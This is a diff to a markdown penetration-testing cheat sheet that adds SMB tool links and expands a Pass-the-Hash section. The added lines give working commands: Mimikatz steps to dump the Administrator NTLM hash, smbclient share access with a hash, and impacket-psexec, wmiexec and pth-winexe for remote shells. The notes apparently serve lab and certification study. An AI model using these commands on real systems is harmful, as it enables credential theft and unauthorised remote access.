@@ -1148,6 +1148,10 @@ masscan -p80 10.11.1.0/24 --rate=1000 -e tap0 --router-ip 10.11.0.1   --rate spe
 
 ### <ins>SMB Enumeration</ins>
 
+**Tools**
+- [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html)
+- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
+
 **Use nmap to scan for the NetBIOS service**<br/>
 `nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254`
 
@@ -3508,10 +3512,22 @@ HTTP POST Attack
 
 
 #### Pass-the-Hash
-- See ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
+
+Note: this attack works for `Administrator` user (except for certain conditions). Since Windows Vista, all Windows versions have [UAC remote restrictions](https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction) enabled by default.
+- From Mimikatz, run `privilege::debug`, `token::elevate` and `lsadump::sam` to obtain the NTLM hash of Administrator
+- Gain access to a SMB share with `smbclient \\\\<IP>\\<SMB-SHARE> -U Administrator --pw-nt-hash <Administrator-HASH>`
+- Gain an interactive shell with `impacket-psexec -hashes <LMHash>:<NTHash> <username>@<ip> <command>`
+  - This will always give a shell as `SYSTEM`, use `impacket-wmiexec` to obtain a shell as the user used for authentication
+  - `<command>` is optional. If left blank, cmd.exe will be executed
+  - See also: [impacket-scripts](https://www.kali.org/tools/impacket-scripts/) 
+
+Other notes:
+- ["Pass the Hash Attack"](https://www.netwrix.com/pass_the_hash_attack_explained.html)
+- ["PsExec Explainer by Mark Russinovich"](https://www.itprotoday.com/windows-server/psexec-explainer-mark-russinovich)
 - [pth-winexe](https://github.com/byt3bl33d3r/pth-toolkit)
-  - `pth-winexe -U username%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //<IP> cmd`
-    - `-U` specifying the user name and hash, along with the SMB share and the name of the command to execute
+  - `pth-winexe -U <domain/username>%<hash> //<targetIP> cmd.exe`
+  - `-U` specifying the username and hash, along with the SMB share and the name of the command to execute
+
 
 
 ## Port Redirection and Tunneling
